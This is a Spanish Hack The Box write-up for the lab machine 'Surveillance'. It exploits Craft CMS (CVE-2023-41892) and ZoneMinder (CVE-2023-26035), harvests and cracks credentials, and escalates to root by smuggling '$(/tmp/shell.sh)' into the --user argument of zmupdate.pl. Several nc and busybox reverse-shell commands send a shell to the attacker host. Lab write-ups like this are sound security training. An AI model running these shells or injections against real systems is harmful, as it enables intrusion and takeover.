---
redirect_from:
  - /posts/SURVEILLANCE-WriteUp/

title: "Surveillance - WriteUp"
date: Sat May 17 2025 09:45:00 GMT+0200 (Central European Summer Time)
categories: [WriteUps, HTB, Linux]
tags: [ctf, nmap, htb, ssh, linpeas, cve, exploit, mysql, bash, hashcat]
image: /assets/img/htb-writeups/Pasted-image-20240118195242.png
---

{% include machine-info.html
  machine="Surveillance"
  os="Linux"
  difficulty="Medium"
  platform="HTB"
%}

![Surveillance](/assets/img/htb-writeups/Pasted-image-20240118195242.png)

-----

Máquina Linux
Dificultad Media

------

NMAP

```bash
sudo nmap -sCV -A -p22,80 10.129.230.42 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-18 19:36 CET
Nmap scan report for surveillance.htb (10.129.230.42)
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title:  Surveillance 
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.0 (96%), Linux 5.4 (95%), Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), HP P2000 G3 NAS device (93%), ASUS RT-N56U WAP (Linux 3.4) (92%), Linux 3.16 (92%), Linux 4.15 - 5.8 (92%), Linux 5.0 - 5.4 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   42.83 ms 10.10.14.1
2   42.34 ms surveillance.htb (10.129.230.42)
```

WHATWEB

```http
$ whatweb http://surveillance.htb
http://surveillance.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[demo@surveillance.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.230.42], JQuery[3.4.1], Script[text/javascript], Title[Surveillance], X-Powered-By[Craft CMS], X-UA-Compatible[IE=edge], nginx[1.18.0]
```

HTTP

![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240118195242.png)

Explorando el código fuente obtenemos la versión exacta de Craft CMS, en este caso es la 4.4.14

![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240118195406.png)

Vamos a buscar vulnerabilidades antes de proceder al fuzzing.

Y encontramos en una página con una exploit para Metasploit la vulnerabilidad CVE-2023-41892

![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240118195546.png)

Encontramos este Poc en Python, nos lo bajamos y lo ejecutamos:

https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226

```bash
$ python3 exploit.py http://surveillance.htb
```

![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240118202250.png)

Como no es una shell normal vamos a intentar enviarnos una shell más completa y volverla totalmente interactiva:

Nos ponemos en escucha por el puerto 4444 con NetCat y ejecutamos lo siguiente en la máquina víctima:

```bash
$ rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.49 4444 >/tmp/f
```

![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240118204659.png)

Encontramos credenciales de la BBDD en el archivo .env en /var/www/html/craft

![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240118211240.png)

Apuntamos las credenciales:

```http
craftuser:CraftCMSPassword2023!
```

Conectamos al servidor MySQL con las credenciales encontradas:

```bash
$ mysql -u craftuser -p
```

![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240118211716.png)

Y tenemos un hash con el que poder jugar con John:

```MySQL
MariaDB [craftdb]> select * from users\G;

*************************** 1. row ***************************
                        id: 1
                   photoId: NULL
                    active: 1
                   pending: 0
                    locked: 0
                 suspended: 0
                     admin: 1
                  username: admin
                  fullName: Matthew B
                 firstName: Matthew
                  lastName: B
                     email: admin@surveillance.htb
                  password: $2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe
             lastLoginDate: 2023-10-17 20:42:03
        lastLoginAttemptIp: NULL
   invalidLoginWindowStart: NULL
         invalidLoginCount: NULL
      lastInvalidLoginDate: 2023-10-17 20:38:18
               lockoutDate: NULL
              hasDashboard: 1
          verificationCode: NULL
verificationCodeIssuedDate: NULL
           unverifiedEmail: NULL
     passwordResetRequired: 0
    lastPasswordChangeDate: 2023-10-17 20:38:29
               dateCreated: 2023-10-11 17:57:16
               dateUpdated: 2023-10-17 20:42:03
1 row in set (0.000 sec)
```

Pero no se puede crackear rápido... 
Hay que buscar otra vía...

Seguimos buscando y encontramos un archivo de backup en formato .zip:

![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240118213430.png)

Como tenemos permisos de lectura, nos lo copiaremos a la carpeta /tmp e intentaremos descomprimirlo ahí.

El archivo es un script SQL para crear la BBDD. Lo examinamos y vemos que en la tabla Users se crea el usuario _Matthew_ con credenciales cifradas.

![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240118214040.png)

```
Hash Matthew:
39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec
```

Según _hashid_ es del tipo SHA-256.
Lo copiamos a un archivo y ejecutamos _hashcat_, a ver si esta vez hay más suerte...

```bash
$ hashcat -m 1400 hash /usr/share/wordlists/rockyou.txt
```

![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240118214621.png)

Esta vez sí hemos tenido suerte!

```http
matthew:starcraft122490
```

Con las credenciales obtenidas cambiamos a _Matthew_, registramos la primera bandera y seguimos...

Nos subimos linpeas y pspy a una carpeta temporal y se lo pasamos para ver qué encontramos.

![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240118215719.png)

Descubrimos que tiene un servicio web corriendo internamente por el puerto 8080, parece un proxy pero de todas formas nos lo traeremos a nuestra máquina para ver qué ofrece.

Encontramos también unas credenciales:

![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240118220330.png)

```
public $test = array(
		'datasource' => 'Database/Mysql',
		'persistent' => false,
		'host' => 'localhost',
		'login' => 'zmuser',
		'password' => 'ZoneMinderPassword2023',
		'database' => 'zm',
		'prefix' => '',
		//'encoding' => 'utf8',
	);
```

```http
zmuser:ZoneMinderPassword2023
```

Vamos a reenviarnos el puerto 8080 de la máquina vícitma a nuestra máquina local y vemos que ofrece:

```bash
$ ssh -L 8080:127.0.0.1:8080 matthew@10.129.230.42
```

Ahora vamos a nuestro navegador e introducimos la URL siguiente:

```http
http://127.0.0.1:8080/
```

![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240118222348.png)

Y obtenemos una página de login. Justo antes _linpeas_ nos había encontrado unas credenciales relativas a un usuario llamado _zoneminder_ o _zm_.

Probamos las credenciales pero no obtenemos éxito.

Vamos a buscar vulnerabilidades de _Zoneminder_ para probar si podemos entrar de otra manera explotando el servicio.

Buscando en los archivos donde encontramos las credenciales, vemos que la versión de Zoneminder es la 1.36.32. 

Encontramos el siguiente PoC para explotarlo: https://github.com/heapbytes/CVE-2023-26035

![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240118232051.png)

Nos lo bajamos y lo ejecutamos. Decir que encontrar el comando correcto para entablar la reverse shell me llevó tiempo, ya que el comando del PoC no entablaba una reverse shell.

```bash
$ python3 zoneminder.py --target http://127.0.0.1:8080/ --cmd 'busybox nc 10.10.14.49 4444 -e sh'
```

Y pa dentro!

![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240119110029.png)

Vemos que podemos ejecutar como sudo un script de Perl que empiece por zm con cualquier carácter del alfabeto con extensión .pl y pasarle argumentos dentro de la carpeta /usr/bin.

Vamos a ver qué archivos podemos ejecutar en esa carpeta que cumplan con esa regex:

![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240119111646.png)

La lista es muy grande y revisar archivo por archivo va a ser una tarea ardua.

En el archivo _zmupdate.pl_ vemos la siguiente sintaxis:

![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240119111845.png)

Podemos pasarle un usuario y contraseña pero después de hacer algunas pruebas, no doy con la tecla, así que busco información en internet y encuentro que en el parámetro -u "dbuser" puedo pasarle una variable que apunte a un $script en bash en vez de un nombre de usuario y lo ejecutará como sudo al tener este privilegio.

Probamos scripts de RevShell y el que me funciona es el mismo que el anterior, con _busybox_.

Creamos el script en una carpeta en el que tengamos permisos de escritura, en mi caso lo haré en /tmp y le copiamos el siguiente contenido:

```bash
#!/bin/bash
busybox nc 10.10.14.49 8888 -e sh
```

Lo guardamos como "shell.sh", le damos permisos de ejecución y nos ponemos en escucha por el puerto que hemos puesto en el script.

```bash
$ nc -nlvp 8888
```

Ahora vamos a ejecutar el archivo perl pero cambiando el parámetro de _userdb_ por la ruta de nuestro script y lo ejecutamos:

```bash
$ sudo /usr/bin/zmupdate.pl --version=1 --user='$(/tmp/shell.sh)' --pass=ZoneMinderPassword2023
```

Pulsamos intro y después escribimos "n" en la segunda pregunta.

Y en la consola donde tenemos el NetCat escuchando recibiremos la consola de root. 
Buen trabajo!

![SURVEILLANCE](/assets/img/htb-writeups/Pasted-image-20240119114650.png)
---

**Última actualización**: 2025-05-17<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
